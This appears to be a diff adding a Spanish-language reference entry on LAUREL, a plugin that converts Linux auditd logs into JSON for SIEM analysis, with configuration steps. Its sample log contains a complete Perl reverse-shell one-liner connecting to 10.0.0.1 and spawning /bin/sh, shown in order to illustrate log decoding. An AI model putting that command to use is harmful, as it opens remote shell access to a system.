@@ -27930,6 +27930,49 @@ $ latex2html -dir DIR archivo.tex (Creará los archivos html en el directorio es
 $ latex2html -html_version 4.0,latin1,unicode archivo.tex (Para que respecte acentos)
 
 
+laurel
+[Linux Audit Usable, Robust, Easy Logging]. Complemento de postprocesamiento para auditd, el sistema de auditoría de Linux, diseñado para transformar los registros de auditoría generados por auditd en un formato más adecuado para su uso en sistemas SIEM [Security Information and Event Management]. En lugar de reemplazar auditd, LAUREL actúa como un plugin que utiliza la interfaz audisp [audit dispatch] para recibir eventos de auditoría, procesarlos y generar registros en un formato basado en JSON, más legible y estructurado para análisis a gran escala en entornos de monitorización de seguridad
+Configurar audisp para enviar eventos a LAUREL
+# nano /etc/audisp/plugins.d/laurel.conf (crear o modificar el archivo)
+        active = yes
+        direction = out
+        path = /usr/local/bin/laurel
+        type = always
+        args = --config /etc/laurel/config.toml
+        format = string
+Configurar LAUREL creando o modificando el archivo:
+# mkdir /etc/laurel
+# nano /etc/laurel/config.toml
+        output = "/var/log/laurel/audit.jsonl"
+        labels = [
+            { key = "software_mgmt", propagate = true }
+        ]
+output --> Define la ruta del archivo de salida donde se escribirán los registros JSON.
+labels --> Permite asociar etiquetas a procesos para filtrar eventos, por ejemplo, marcar eventos relacionados con la gestión de software).
+# systemctl restart auditd (reiniciar auditd para aplicar los cambios)
+Una vez configurado, LAUREL procesa automáticamente los eventos de auditd y genera registros en formato JSON en el archivo especificado [/var/log/laurel/audit.jsonl] donde se puede inspeccionar los registros para analizar eventos de seguridad.
+Como ejemplo, sin LAUREL un registro de auditd podría verse así
+        type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B65742…
+Con LAUREL, el mismo evento se transforma en un registro JSON legible:
+        {
+          "EXECVE": {
+            "argc": 3,
+            "ARGV": [
+              "perl",
+              "-e",
+              "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"
+            ]
+          },
+          "PARENT_INFO": {
+            "ID": "1643635026.276:327308",
+            "comm": "sh",
+            "exe": "/usr/bin/dash",
+            "ppid": 3190631
+          }
+        }
+Este formato es mucho más claro para un analista de SIEM, mostrando los argumentos del comando sin codificación hexadecimal y proporcionando información sobre el proceso padre.
+
+
 lazygal
 Generar una galería web.
 $ lazygal directorio_con_las_imagenes  (Creará todos los archivos en el presente directorio por lo que es preferible estar en un directorio vacio)
